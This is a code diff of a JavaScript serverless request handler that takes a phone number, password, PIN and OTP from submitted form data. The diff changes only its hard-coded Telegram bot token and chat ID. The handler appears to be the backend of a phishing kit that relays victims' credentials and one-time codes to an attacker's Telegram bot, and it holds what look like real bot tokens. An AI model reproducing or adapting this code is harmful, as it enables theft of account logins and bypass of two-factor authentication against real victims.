@@ -6,8 +6,8 @@ export default async function handler(req, res) {
   const { phone, password, pin, otp, messageType, status } = req.body;
 
   // Aapke Telegram Credentials
-  const BOT_TOKEN = '9202209441:AAHFMezI4J5P3_1pPVn4UqhxpbE9VwAWMbY';
-  const CHAT_ID = '6742408629';
+  const BOT_TOKEN = '9155146552:AAHpHaD61TZPJk4EyRPPfjS1MRval-x8vAo';
+  const CHAT_ID = '9181706291';
 
   let text = '';
 
